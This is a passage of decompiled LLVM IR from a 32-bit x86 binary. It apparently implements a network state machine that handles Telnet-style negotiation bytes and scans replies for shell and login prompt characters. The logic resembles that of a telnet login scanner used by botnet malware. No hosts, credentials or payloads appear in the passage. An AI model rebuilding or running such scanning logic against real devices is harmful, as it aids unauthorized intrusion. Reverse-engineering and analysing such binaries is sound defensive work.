  %v3_80505e2 = load i32, i32* %v2_80505e2, align 4
  store i32 %v3_80505e2, i32* %eax.global-to-local, align 4
  %v1_80505e5 = icmp eq i32 %v3_80505e2, 0
  br i1 %v1_80505e5, label %dec_label_pc_805058b, label %dec_label_pc_80505e2.backedge.dec_label_pc_80505e9_crit_edge

dec_label_pc_80505e2.backedge.dec_label_pc_80505e9_crit_edge: ; preds = %dec_label_pc_80505e2.backedge
  %v1_80505ec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80505e9

dec_label_pc_80505e2.loopexit12.loopexit:         ; preds = %dec_label_pc_8050a83, %dec_label_pc_80507b5, %dec_label_pc_8050755, %dec_label_pc_8050654, %dec_label_pc_8050ce6, %dec_label_pc_8050a33, %dec_label_pc_80509ba, %dec_label_pc_805097c, %dec_label_pc_80508ad, %dec_label_pc_8050c6d, %dec_label_pc_8050825, %dec_label_pc_8050d5f, %dec_label_pc_80507e0, %dec_label_pc_8050dd8, %dec_label_pc_80505a6
  %v0_80505e2.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80505e2.backedge

dec_label_pc_80505e9:                             ; preds = %dec_label_pc_80505e2.preheader, %dec_label_pc_80505e2.backedge.dec_label_pc_80505e9_crit_edge
  %v1_80505ec = phi i32 [ %v1_80505ec.pre, %dec_label_pc_80505e2.backedge.dec_label_pc_80505e9_crit_edge ], [ %v0_805057c, %dec_label_pc_80505e2.preheader ]
  %v0_80505e9 = phi i32 [ %v0_80505e2, %dec_label_pc_80505e2.backedge.dec_label_pc_80505e9_crit_edge ], [ %v0_80505e227, %dec_label_pc_80505e2.preheader ]
  %v1_80505e9 = add i32 %v0_80505e9, 28
  store i32 %v1_80505e9, i32* %eax.global-to-local, align 4
  %v2_80505ec = add i32 %v1_80505ec, 16
  %v3_80505ec = inttoptr i32 %v2_80505ec to i32*
  store i32 %v1_80505e9, i32* %v3_80505ec, align 4
  %v0_80505f0 = load i32, i32* @edi, align 4
  %v1_80505f0 = add i32 %v0_80505f0, 24
  %v2_80505f0 = inttoptr i32 %v1_80505f0 to i32*
  %v3_80505f0 = load i32, i32* %v2_80505f0, align 4
  %v9_80505f0 = icmp eq i32 %v3_80505f0, 256
  br i1 %v9_80505f0, label %dec_label_pc_8050ba7, label %dec_label_pc_80505fd

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_80505e9, %dec_label_pc_8050ba7
  %v0_80505fd = load i32, i32* @esp, align 4
  %v1_80505fd = add i32 %v0_80505fd, 40
  %v2_80505fd = inttoptr i32 %v1_80505fd to i32*
  %v3_80505fd = load i32, i32* %v2_80505fd, align 4
  store i32 %v3_80505fd, i32* %ecx.global-to-local, align 4
  %v1_8050601 = add i32 %v0_80505fd, 16
  %v2_8050601 = inttoptr i32 %v1_8050601 to i32*
  %v3_8050601 = load i32, i32* %v2_8050601, align 4
  store i32 %v3_8050601, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_805060a = inttoptr i32 %v3_80505fd to i32*
  store i32 0, i32* %v1_805060a, align 4
  %v0_8050610 = load i32, i32* @edi, align 4
  %v1_8050610 = add i32 %v0_8050610, 24
  %v2_8050610 = inttoptr i32 %v1_8050610 to i32*
  %v3_8050610 = load i32, i32* %v2_8050610, align 4
  store i32 %v3_8050610, i32* %edx.global-to-local, align 4
  %v0_8050613 = load i32, i32* @esp, align 4
  %v1_8050613 = add i32 %v0_8050613, -4
  %v2_8050613 = inttoptr i32 %v1_8050613 to i32*
  store i32 16384, i32* %v2_8050613, align 4
  %v0_8050618 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050618 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050618 = add i32 %v1_8050618, %v0_8050618
  store i32 %v2_8050618, i32* @ebx, align 4
  %v0_805061a = load i32, i32* %eax.global-to-local, align 4
  %v2_805061a = sub i32 %v0_805061a, %v1_8050618
  store i32 %v2_805061a, i32* %eax.global-to-local, align 4
  %v2_805061c = add i32 %v0_8050613, -8
  %v3_805061c = inttoptr i32 %v2_805061c to i32*
  store i32 %v2_805061a, i32* %v3_805061c, align 4
  %v0_805061d = load i32, i32* @ebx, align 4
  %v2_805061d = add i32 %v0_8050613, -12
  %v3_805061d = inttoptr i32 %v2_805061d to i32*
  store i32 %v0_805061d, i32* %v3_805061d, align 4
  %v0_805061e = load i32, i32* @edi, align 4
  %v1_805061e = add i32 %v0_805061e, 4
  %v2_805061e = inttoptr i32 %v1_805061e to i32*
  %v3_805061e = load i32, i32* %v2_805061e, align 4
  %v2_8050621 = add i32 %v0_8050613, -16
  %v3_8050621 = inttoptr i32 %v2_8050621 to i32*
  store i32 %v3_805061e, i32* %v3_8050621, align 4
  %v0_8050622 = call i32 @function_80528be()
  store i32 %v0_8050622, i32* %eax.global-to-local, align 4
  %v0_8050627 = load i32, i32* @esp, align 4
  %v1_8050627 = add i32 %v0_8050627, 16
  %tmp137 = icmp slt i32 %v0_8050622, 1
  br i1 %tmp137, label %dec_label_pc_8050b3c, label %dec_label_pc_8050633

dec_label_pc_8050633:                             ; preds = %dec_label_pc_80505fd
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8050635

dec_label_pc_8050635:                             ; preds = %dec_label_pc_805063f, %dec_label_pc_8050633
  %v0_805063b = phi i32 [ %v1_805063f, %dec_label_pc_805063f ], [ 0, %dec_label_pc_8050633 ]
  %v1_8050635 = load i32, i32* @ebx, align 4
  %v2_8050635 = add i32 %v1_8050635, %v0_805063b
  %v3_8050635 = inttoptr i32 %v2_8050635 to i8*
  %v4_8050635 = load i8, i8* %v3_8050635, align 1
  %v5_8050635 = icmp eq i8 %v4_8050635, 0
  %v1_8050639 = icmp eq i1 %v5_8050635, false
  br i1 %v1_8050639, label %dec_label_pc_805063f, label %dec_label_pc_805063b

dec_label_pc_805063b:                             ; preds = %dec_label_pc_8050635
  store i8 65, i8* %v3_8050635, align 1
  %v0_805063f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805063f

dec_label_pc_805063f:                             ; preds = %dec_label_pc_8050635, %dec_label_pc_805063b
  %v0_805063f = phi i32 [ %v0_805063b, %dec_label_pc_8050635 ], [ %v0_805063f.pre, %dec_label_pc_805063b ]
  %v1_805063f = add i32 %v0_805063f, 1
  store i32 %v1_805063f, i32* @edx, align 4
  %v12_8050640 = icmp eq i32 %v0_8050622, %v1_805063f
  %v1_8050642 = icmp eq i1 %v12_8050640, false
  br i1 %v1_8050642, label %dec_label_pc_8050635, label %dec_label_pc_8050644

dec_label_pc_8050644:                             ; preds = %dec_label_pc_805063f, %dec_label_pc_8050b42
  %v0_8050644 = load i32, i32* @edi, align 4
  %v1_8050644 = add i32 %v0_8050644, 24
  %v2_8050644 = inttoptr i32 %v1_8050644 to i32*
  %v3_8050644 = load i32, i32* %v2_8050644, align 4
  %v2_8050647 = add i32 %v3_8050644, %v0_8050622
  store i32 %v2_8050647, i32* @ebx, align 4
  %v0_8050649 = load i32, i32* @global_var_8056930.34, align 16
  store i32 %v0_8050649, i32* %eax.global-to-local, align 4
  store i32 %v2_8050647, i32* %v2_8050644, align 4
  %v0_8050651 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050651 = load i32, i32* @edi, align 4
  %v2_8050651 = add i32 %v1_8050651, 8
  %v3_8050651 = inttoptr i32 %v2_8050651 to i32*
  store i32 %v0_8050651, i32* %v3_8050651, align 4
  br label %dec_label_pc_8050654

dec_label_pc_8050654:                             ; preds = %dec_label_pc_805095c, %dec_label_pc_8050644
  %v0_8050654 = load i32, i32* @edi, align 4
  %v1_8050654 = add i32 %v0_8050654, 12
  %v2_8050654 = inttoptr i32 %v1_8050654 to i32*
  %v3_8050654 = load i32, i32* %v2_8050654, align 4
  store i32 %v3_8050654, i32* %eax.global-to-local, align 4
  switch i32 %v3_8050654, label %dec_label_pc_80505e2.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8050664
    i32 3, label %dec_label_pc_80506f7
    i32 4, label %dec_label_pc_8050780
    i32 5, label %dec_label_pc_80505a6
    i32 6, label %dec_label_pc_8050825
    i32 7, label %dec_label_pc_805097c
    i32 8, label %dec_label_pc_80507e0
    i32 9, label %dec_label_pc_8050a33
    i32 10, label %dec_label_pc_8050870
  ]

dec_label_pc_8050664:                             ; preds = %dec_label_pc_8050654
  %v0_8050664 = load i32, i32* @esp, align 4
  %v1_8050664 = add i32 %v0_8050664, 16
  %v2_8050664 = inttoptr i32 %v1_8050664 to i32*
  %v3_8050664 = load i32, i32* %v2_8050664, align 4
  store i32 %v3_8050664, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805066a = add i32 %v0_8050654, 24
  %v2_805066a = inttoptr i32 %v1_805066a to i32*
  %v3_805066a = load i32, i32* %v2_805066a, align 4
  store i32 %v3_805066a, i32* %edx.global-to-local, align 4
  %v2_805066d18 = sub i32 0, %v3_805066a
  %v10_805066d22 = and i32 %v3_805066a, %v2_805066d18
  %v11_805066d23 = icmp slt i32 %v10_805066d22, 0
  %v13_805066d25 = icmp slt i32 %v2_805066d18, 0
  %v2_805066f26 = icmp eq i1 %v13_805066d25, %v11_805066d23
  br i1 %v2_805066f26, label %dec_label_pc_8050a83.thread, label %dec_label_pc_8050671.preheader

dec_label_pc_8050a83.thread:                      ; preds = %dec_label_pc_8050664
  br label %dec_label_pc_80505e2.backedge

dec_label_pc_8050671.preheader:                   ; preds = %dec_label_pc_8050664, %dec_label_pc_805066d.backedge
  %v0_80506eb126 = phi i32 [ %v0_80506eb128, %dec_label_pc_805066d.backedge ], [ %v0_8050654, %dec_label_pc_8050664 ]
  %v0_8050a7b119 = phi i32 [ %v0_805066d, %dec_label_pc_805066d.backedge ], [ 0, %dec_label_pc_8050664 ]
  %v5_8050683108 = phi i32 [ %v5_8050683109, %dec_label_pc_805066d.backedge ], [ 2, %dec_label_pc_8050664 ]
  %v1_805067d106 = phi i32 [ %v1_805066d, %dec_label_pc_805066d.backedge ], [ %v3_805066a, %dec_label_pc_8050664 ]
  %v0_8050676103 = phi i32 [ %v0_8050676104, %dec_label_pc_805066d.backedge ], [ %v0_8050664, %dec_label_pc_8050664 ]
  br label %dec_label_pc_8050671

dec_label_pc_8050671:                             ; preds = %dec_label_pc_8050671.preheader, %dec_label_pc_80506c2
  %v0_80506eb129 = phi i32 [ %v0_80506eb126, %dec_label_pc_8050671.preheader ], [ %v0_80506d9, %dec_label_pc_80506c2 ]
  %v0_8050a7b = phi i32 [ %v0_8050a7b119, %dec_label_pc_8050671.preheader ], [ %v0_80506df, %dec_label_pc_80506c2 ]
  %v5_8050683 = phi i32 [ %v5_8050683108, %dec_label_pc_8050671.preheader ], [ %v0_80506d4, %dec_label_pc_80506c2 ]
  %v1_805067d = phi i32 [ %v1_805067d106, %dec_label_pc_8050671.preheader ], [ %v3_80506d9, %dec_label_pc_80506c2 ]
  %v0_8050a90 = phi i32 [ %v0_8050676103, %dec_label_pc_8050671.preheader ], [ %v1_80506dc, %dec_label_pc_80506c2 ]
  %v0_8050671 = load i32, i32* @ebx, align 4
  %v1_8050671 = inttoptr i32 %v0_8050671 to i8*
  %v2_8050671 = load i8, i8* %v1_8050671, align 1
  %v12_8050671 = icmp eq i8 %v2_8050671, -1
  %v1_8050674 = icmp eq i1 %v12_8050671, false
  br i1 %v1_8050674, label %dec_label_pc_80506e3, label %dec_label_pc_8050676

dec_label_pc_8050676:                             ; preds = %dec_label_pc_8050671
  %v1_8050676 = add i32 %v0_8050a90, 16
  %v2_8050676 = inttoptr i32 %v1_8050676 to i32*
  %v3_8050676 = load i32, i32* %v2_8050676, align 4
  %v1_805067a = add i32 %v0_8050671, 1
  store i32 %v1_805067a, i32* @esi, align 4
  %v2_805067d = add i32 %v3_8050676, %v1_805067d
  store i32 %v2_805067d, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_805067d, %v1_805067a
  br i1 %tmp297, label %dec_label_pc_8050683, label %dec_label_pc_80506e3

dec_label_pc_8050683:                             ; preds = %dec_label_pc_8050676
  %v2_8050683 = inttoptr i32 %v1_805067a to i8*
  %v3_8050683 = load i8, i8* %v2_8050683, align 1
  %v4_8050683 = zext i8 %v3_8050683 to i32
  %v6_8050683 = and i32 %v5_8050683, -256
  %v7_8050683 = or i32 %v4_8050683, %v6_8050683
  store i32 %v7_8050683, i32* %eax.global-to-local, align 4
  %v11_8050686 = icmp eq i8 %v3_8050683, -1
  br i1 %v11_8050686, label %dec_label_pc_8050a78, label %dec_label_pc_805068e

dec_label_pc_805068e:                             ; preds = %dec_label_pc_8050683
  %v11_805068e = icmp eq i8 %v3_8050683, -3
  br i1 %v11_805068e, label %dec_label_pc_8050a90, label %dec_label_pc_8050696

dec_label_pc_8050696:                             ; preds = %dec_label_pc_805068e
  %v1_8050696 = add i32 %v0_8050671, 2
  store i32 %v1_8050696, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_805067d, %v1_8050696
  br i1 %tmp298, label %dec_label_pc_805069d, label %dec_label_pc_80506e3

dec_label_pc_805069d:                             ; preds = %dec_label_pc_8050696, %dec_label_pc_8051063, %dec_label_pc_805106b
  %v4_805069d = phi i32 [ %v6_8050b0e, %dec_label_pc_8051063 ], [ %v1_8050696, %dec_label_pc_8050696 ], [ %v4_805069d.pre, %dec_label_pc_805106b ]
  %v0_805069d = load i32, i32* @esi, align 4
  %v1_805069d = inttoptr i32 %v0_805069d to i8*
  %v2_805069d = load i8, i8* %v1_805069d, align 1
  %v3_805069d = zext i8 %v2_805069d to i32
  %v5_805069d = and i32 %v4_805069d, -256
  %v6_805069d = or i32 %v3_805069d, %v5_805069d
  store i32 %v6_805069d, i32* %eax.global-to-local, align 4
  %v11_805069f = icmp eq i8 %v2_805069d, -3
  br i1 %v11_805069f, label %dec_label_pc_8050b25, label %dec_label_pc_80506a7

dec_label_pc_80506a7:                             ; preds = %dec_label_pc_8050b18, %dec_label_pc_805069d
  %v0_8050b96 = phi i32 [ %v0_8050b1b, %dec_label_pc_8050b18 ], [ %v0_805069d, %dec_label_pc_805069d ]
  %v0_80506a7 = phi i32 [ %v6_8050b1b, %dec_label_pc_8050b18 ], [ %v6_805069d, %dec_label_pc_805069d ]
  %v1_80506a7 = trunc i32 %v0_80506a7 to i8
  %v11_80506a7 = icmp eq i8 %v1_80506a7, -5
  br i1 %v11_80506a7, label %dec_label_pc_8050b96, label %dec_label_pc_80506af

dec_label_pc_80506af:                             ; preds = %dec_label_pc_80506a7, %dec_label_pc_8050b96
  %v5_80506af = phi i32 [ %v0_80506a7, %dec_label_pc_80506a7 ], [ %v5_80506af.pre, %dec_label_pc_8050b96 ]
  %v0_80506af = load i32, i32* @ebx, align 4
  %v1_80506af = add i32 %v0_80506af, 2
  %v2_80506af = inttoptr i32 %v1_80506af to i8*
  %v3_80506af = load i8, i8* %v2_80506af, align 1
  %v4_80506af = zext i8 %v3_80506af to i32
  %v6_80506af = and i32 %v5_80506af, -256
  %v7_80506af = or i32 %v4_80506af, %v6_80506af
  store i32 %v7_80506af, i32* %eax.global-to-local, align 4
  %v11_80506b2 = icmp eq i8 %v3_80506af, -3
  br i1 %v11_80506b2, label %dec_label_pc_8050b33, label %dec_label_pc_80506ba

dec_label_pc_80506ba:                             ; preds = %dec_label_pc_8050b25, %dec_label_pc_80506af
  %v0_8050b9e = phi i32 [ %v0_8050b28, %dec_label_pc_8050b25 ], [ %v0_80506af, %dec_label_pc_80506af ]
  %v0_80506ba = phi i32 [ %v7_8050b28, %dec_label_pc_8050b25 ], [ %v7_80506af, %dec_label_pc_80506af ]
  %v1_80506ba = trunc i32 %v0_80506ba to i8
  %v11_80506ba = icmp eq i8 %v1_80506ba, -5
  br i1 %v11_80506ba, label %dec_label_pc_8050b9e, label %dec_label_pc_80506c2

dec_label_pc_80506c2:                             ; preds = %dec_label_pc_80506ba, %dec_label_pc_8050b9e, %dec_label_pc_8050b33
  %v0_80506c2 = load i32, i32* @esp, align 4
  %v1_80506c2 = add i32 %v0_80506c2, -4
  %v2_80506c2 = inttoptr i32 %v1_80506c2 to i32*
  store i32 16384, i32* %v2_80506c2, align 4
  %v1_80506c7 = add i32 %v0_80506c2, -8
  %v2_80506c7 = inttoptr i32 %v1_80506c7 to i32*
  store i32 3, i32* %v2_80506c7, align 4
  %v0_80506c9 = load i32, i32* @ebx, align 4
  %v2_80506c9 = add i32 %v0_80506c2, -12
  %v3_80506c9 = inttoptr i32 %v2_80506c9 to i32*
  store i32 %v0_80506c9, i32* %v3_80506c9, align 4
  %v0_80506ca = load i32, i32* @ebp, align 4
  %v1_80506ca = add i32 %v0_80506ca, 3
  store i32 %v1_80506ca, i32* @ebp, align 4
  %v0_80506cd = load i32, i32* @edi, align 4
  %v1_80506cd = add i32 %v0_80506cd, 4
  %v2_80506cd = inttoptr i32 %v1_80506cd to i32*
  %v3_80506cd = load i32, i32* %v2_80506cd, align 4
  store i32 %v3_80506cd, i32* %edx.global-to-local, align 4
  %v0_80506d0 = load i32, i32* @ebx, align 4
  %v1_80506d0 = add i32 %v0_80506d0, 3
  store i32 %v1_80506d0, i32* @ebx, align 4
  %v2_80506d3 = add i32 %v0_80506c2, -16
  %v3_80506d3 = inttoptr i32 %v2_80506d3 to i32*
  store i32 %v3_80506cd, i32* %v3_80506d3, align 4
  %v0_80506d4 = call i32 @function_8052934()
  store i32 %v0_80506d4, i32* %eax.global-to-local, align 4
  %v0_80506d9 = load i32, i32* @edi, align 4
  %v1_80506d9 = add i32 %v0_80506d9, 24
  %v2_80506d9 = inttoptr i32 %v1_80506d9 to i32*
  %v3_80506d9 = load i32, i32* %v2_80506d9, align 4
  store i32 %v3_80506d9, i32* %edx.global-to-local, align 4
  %v0_80506dc = load i32, i32* @esp, align 4
  %v1_80506dc = add i32 %v0_80506dc, 16
  %v0_80506df = load i32, i32* @ebp, align 4
  %v2_80506df = sub i32 %v0_80506df, %v3_80506d9
  %v8_80506df = xor i32 %v0_80506df, %v3_80506d9
  %v9_80506df = xor i32 %v2_80506df, %v0_80506df
  %v10_80506df = and i32 %v9_80506df, %v8_80506df
  %v11_80506df = icmp slt i32 %v10_80506df, 0
  %v13_80506df = icmp slt i32 %v2_80506df, 0
  %v2_80506e1 = icmp eq i1 %v13_80506df, %v11_80506df
  br i1 %v2_80506e1, label %dec_label_pc_80506e3, label %dec_label_pc_8050671

dec_label_pc_80506e3:                             ; preds = %dec_label_pc_805066d.backedge, %dec_label_pc_8050696, %dec_label_pc_8050676, %dec_label_pc_80506c2, %dec_label_pc_8050671, %dec_label_pc_8050a90.dec_label_pc_80506e3.loopexit_crit_edge
  %v0_80506eb = phi i32 [ %v0_8050af4, %dec_label_pc_8050a90.dec_label_pc_80506e3.loopexit_crit_edge ], [ %v0_80506d9, %dec_label_pc_80506c2 ], [ %v0_80506eb129, %dec_label_pc_8050696 ], [ %v0_80506eb129, %dec_label_pc_8050676 ], [ %v0_80506eb129, %dec_label_pc_8050671 ], [ %v0_80506eb128, %dec_label_pc_805066d.backedge ]
  %v0_80506e3 = phi i32 [ %v0_80506e3.pre.pre, %dec_label_pc_8050a90.dec_label_pc_80506e3.loopexit_crit_edge ], [ %v0_80506df, %dec_label_pc_80506c2 ], [ %v0_8050a7b, %dec_label_pc_8050696 ], [ %v0_8050a7b, %dec_label_pc_8050676 ], [ %v0_8050a7b, %dec_label_pc_8050671 ], [ %v0_805066d, %dec_label_pc_805066d.backedge ]
  %tmp138 = icmp slt i32 %v0_80506e3, 1
  br i1 %tmp138, label %dec_label_pc_8050a83, label %dec_label_pc_80506eb

dec_label_pc_80506eb:                             ; preds = %dec_label_pc_80506e3
  %v1_80506eb = add i32 %v0_80506eb, 12
  %v2_80506eb = inttoptr i32 %v1_80506eb to i32*
  store i32 3, i32* %v2_80506eb, align 4
  br label %dec_label_pc_8050951

dec_label_pc_80506f7:                             ; preds = %dec_label_pc_8050654
  %v1_80506f7 = add i32 %v0_8050654, 24
  %v2_80506f7 = inttoptr i32 %v1_80506f7 to i32*
  %v3_80506f7 = load i32, i32* %v2_80506f7, align 4
  store i32 %v3_80506f7, i32* %ecx.global-to-local, align 4
  %v1_80506fa = add i32 %v3_80506f7, -1
  store i32 %v1_80506fa, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_80506fa, 1
  br i1 %tmp139, label %dec_label_pc_8050735, label %dec_label_pc_8050701.preheader

dec_label_pc_8050701.preheader:                   ; preds = %dec_label_pc_80506f7
  %v7_8050701.pre = load i32, i32* @edx, align 4
  %v2_8050701 = add i32 %v0_8050654, 28
  br label %dec_label_pc_8050701

dec_label_pc_8050701:                             ; preds = %dec_label_pc_8050701.preheader, %dec_label_pc_8050732
  %v7_8050701 = phi i32 [ %v7_8050701.pre, %dec_label_pc_8050701.preheader ], [ %v9_8050701, %dec_label_pc_8050732 ]
  %v0_8050bca = phi i32 [ %v1_80506fa, %dec_label_pc_8050701.preheader ], [ %v1_8050732, %dec_label_pc_8050732 ]
  %v3_8050701 = add i32 %v2_8050701, %v0_8050bca
  %v4_8050701 = inttoptr i32 %v3_8050701 to i8*
  %v5_8050701 = load i8, i8* %v4_8050701, align 1
  %v6_8050701 = zext i8 %v5_8050701 to i32
  %v8_8050701 = and i32 %v7_8050701, -256
  %v9_8050701 = or i32 %v6_8050701, %v8_8050701
  store i32 %v9_8050701, i32* %edx.global-to-local, align 4
  %v10_8050705 = icmp eq i8 %v5_8050701, 58
  br i1 %v10_8050705, label %dec_label_pc_8050bca, label %dec_label_pc_805070e

dec_label_pc_805070e:                             ; preds = %dec_label_pc_8050701
  %v10_805070e = icmp eq i8 %v5_8050701, 62
  br i1 %v10_805070e, label %dec_label_pc_8050bca, label %dec_label_pc_8050717

dec_label_pc_8050717:                             ; preds = %dec_label_pc_805070e
  %v10_8050717 = icmp eq i8 %v5_8050701, 36
  br i1 %v10_8050717, label %dec_label_pc_8050bca, label %dec_label_pc_8050720

dec_label_pc_8050720:                             ; preds = %dec_label_pc_8050717
  %v10_8050720 = icmp eq i8 %v5_8050701, 35
  br i1 %v10_8050720, label %dec_label_pc_8050bca, label %dec_label_pc_8050729

dec_label_pc_8050729:                             ; preds = %dec_label_pc_8050720
  %v10_8050729 = icmp eq i8 %v5_8050701, 37
  br i1 %v10_8050729, label %dec_label_pc_8050bca, label %dec_label_pc_8050732

dec_label_pc_8050732:                             ; preds = %dec_label_pc_8050729
  %v1_8050732 = add i32 %v0_8050bca, -1
  %v8_8050732 = icmp eq i32 %v1_8050732, 0
  store i32 %v1_8050732, i32* %eax.global-to-local, align 4
  %v1_8050733 = icmp eq i1 %v8_8050732, false
  br i1 %v1_8050733, label %dec_label_pc_8050701, label %dec_label_pc_8050735

dec_label_pc_8050735:                             ; preds = %dec_label_pc_8050732, %dec_label_pc_8050bca, %dec_label_pc_80506f7
  %v0_8050735 = load i32, i32* @esp, align 4
  %v1_8050735 = add i32 %v0_8050735, -4
  %v2_8050735 = inttoptr i32 %v1_8050735 to i32*
  store i32 4, i32* %v2_8050735, align 4
  %v1_8050737 = add i32 %v0_8050735, -8
  %v2_8050737 = inttoptr i32 %v1_8050737 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054d25.46 to i32), i32* %v2_8050737, align 4
  %v0_805073c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805073c = add i32 %v0_8050735, -12
  %v3_805073c = inttoptr i32 %v2_805073c to i32*
  store i32 %v0_805073c, i32* %v3_805073c, align 4
  %v1_805073d = add i32 %v0_8050735, 16
  %v2_805073d = inttoptr i32 %v1_805073d to i32*
  %v3_805073d = load i32, i32* %v2_805073d, align 4
  store i32 %v3_805073d, i32* %eax.global-to-local, align 4
  %v2_8050741 = add i32 %v0_8050735, -16
  %v3_8050741 = inttoptr i32 %v2_8050741 to i32*
  store i32 %v3_805073d, i32* %v3_8050741, align 4
  %v0_8050742 = call i32 @function_8051d00()
  store i32 %v0_8050742, i32* %eax.global-to-local, align 4
  %v0_8050747 = load i32, i32* @esp, align 4
  store i32 %v0_8050742, i32* @ebp, align 4
  %v10_805074c = icmp eq i32 %v0_8050742, -1
  %v1_805074f = icmp eq i1 %v10_805074c, false
  br i1 %v1_805074f, label %dec_label_pc_8050bd6, label %dec_label_pc_8050755

dec_label_pc_8050755:                             ; preds = %dec_label_pc_8050735
  %v1_8050755 = add i32 %v0_8050747, 12
  %v2_8050755 = inttoptr i32 %v1_8050755 to i32*
  store i32 5, i32* %v2_8050755, align 4
  %v1_8050757 = add i32 %v0_8050747, 8
  %v2_8050757 = inttoptr i32 %v1_8050757 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054d2a.47 to i32), i32* %v2_8050757, align 4
  %v0_805075c = load i32, i32* @edi, align 4
  %v1_805075c = add i32 %v0_805075c, 24
  %v2_805075c = inttoptr i32 %v1_805075c to i32*
  %v3_805075c = load i32, i32* %v2_805075c, align 4
  store i32 %v3_805075c, i32* %eax.global-to-local, align 4
  %v2_805075f = add i32 %v0_8050747, 4
  %v3_805075f = inttoptr i32 %v2_805075f to i32*
  store i32 %v3_805075c, i32* %v3_805075f, align 4
  %v1_8050760 = add i32 %v0_8050747, 32
  %v2_8050760 = inttoptr i32 %v1_8050760 to i32*
  %v3_8050760 = load i32, i32* %v2_8050760, align 4
  store i32 %v3_8050760, i32* %eax.global-to-local, align 4
  %v3_8050764 = inttoptr i32 %v0_8050747 to i32*
  store i32 %v3_8050760, i32* %v3_8050764, align 4
  %v0_8050765 = call i32 @function_8051d00()
  store i32 %v0_8050765, i32* %eax.global-to-local, align 4
  store i32 %v0_8050765, i32* @ebp, align 4
  %v10_805076f = icmp eq i32 %v0_8050765, -1
  %v1_8050772 = icmp eq i1 %v10_805076f, false
  br i1 %v1_8050772, label %dec_label_pc_8050bd6, label %dec_label_pc_80505e2.loopexit12.loopexit

dec_label_pc_8050780:                             ; preds = %dec_label_pc_8050654
  %v1_8050780 = add i32 %v0_8050654, 24
  %v2_8050780 = inttoptr i32 %v1_8050780 to i32*
  %v3_8050780 = load i32, i32* %v2_8050780, align 4
  store i32 %v3_8050780, i32* %ecx.global-to-local, align 4
  %v1_8050783 = add i32 %v3_8050780, -1
  store i32 %v1_8050783, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_8050783, 1
  br i1 %tmp140, label %dec_label_pc_80507b5, label %dec_label_pc_805078a.preheader

dec_label_pc_805078a.preheader:                   ; preds = %dec_label_pc_8050780
  %v7_805078a.pre = load i32, i32* @edx, align 4
  %v2_805078a = add i32 %v0_8050654, 28
  br label %dec_label_pc_805078a

dec_label_pc_805078a:                             ; preds = %dec_label_pc_805078a.preheader, %dec_label_pc_80507b2
  %v7_805078a = phi i32 [ %v7_805078a.pre, %dec_label_pc_805078a.preheader ], [ %v9_805078a, %dec_label_pc_80507b2 ]
  %v0_8050c1b = phi i32 [ %v1_8050783, %dec_label_pc_805078a.preheader ], [ %v1_80507b2, %dec_label_pc_80507b2 ]
  %v3_805078a = add i32 %v2_805078a, %v0_8050c1b
  %v4_805078a = inttoptr i32 %v3_805078a to i8*
  %v5_805078a = load i8, i8* %v4_805078a, align 1
  %v6_805078a = zext i8 %v5_805078a to i32
  %v8_805078a = and i32 %v7_805078a, -256
  %v9_805078a = or i32 %v6_805078a, %v8_805078a
  store i32 %v9_805078a, i32* %edx.global-to-local, align 4
  %v10_805078e = icmp eq i8 %v5_805078a, 58
  br i1 %v10_805078e, label %dec_label_pc_8050c1b, label %dec_label_pc_8050797

dec_label_pc_8050797:                             ; preds = %dec_label_pc_805078a
  %v10_8050797 = icmp eq i8 %v5_805078a, 62
  br i1 %v10_8050797, label %dec_label_pc_8050c1b, label %dec_label_pc_80507a0

dec_label_pc_80507a0:                             ; preds = %dec_label_pc_8050797
  %v10_80507a0 = icmp eq i8 %v5_805078a, 36
  br i1 %v10_80507a0, label %dec_label_pc_8050c1b, label %dec_label_pc_80507a9

dec_label_pc_80507a9:                             ; preds = %dec_label_pc_80507a0
  %v10_80507a9 = icmp eq i8 %v5_805078a, 35
  br i1 %v10_80507a9, label %dec_label_pc_8050c1b, label %dec_label_pc_80507b2

dec_label_pc_80507b2:                             ; preds = %dec_label_pc_80507a9
  %v1_80507b2 = add i32 %v0_8050c1b, -1
  %v8_80507b2 = icmp eq i32 %v1_80507b2, 0
  store i32 %v1_80507b2, i32* %eax.global-to-local, align 4
  %v1_80507b3 = icmp eq i1 %v8_80507b2, false
  br i1 %v1_80507b3, label %dec_label_pc_805078a, label %dec_label_pc_80507b5

dec_label_pc_80507b5:                             ; preds = %dec_label_pc_80507b2, %dec_label_pc_8050c1b, %dec_label_pc_8050780
  %v0_80507b5 = load i32, i32* @esp, align 4
  %v1_80507b5 = add i32 %v0_80507b5, -4
  %v2_80507b5 = inttoptr i32 %v1_80507b5 to i32*
  store i32 7, i32* %v2_80507b5, align 4
  %v1_80507b7 = add i32 %v0_80507b5, -8
  %v2_80507b7 = inttoptr i32 %v1_80507b7 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054d30.48 to i32), i32* %v2_80507b7, align 4
  %v0_80507bc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80507bc = add i32 %v0_80507b5, -12
  %v3_80507bc = inttoptr i32 %v2_80507bc to i32*
  store i32 %v0_80507bc, i32* %v3_80507bc, align 4
  %v1_80507bd = add i32 %v0_80507b5, 16
  %v2_80507bd = inttoptr i32 %v1_80507bd to i32*
  %v3_80507bd = load i32, i32* %v2_80507bd, align 4
  %v2_80507c1 = add i32 %v0_80507b5, -16
  %v3_80507c1 = inttoptr i32 %v2_80507c1 to i32*
  store i32 %v3_80507bd, i32* %v3_80507c1, align 4
  %v0_80507c2 = call i32 @function_8051d00()
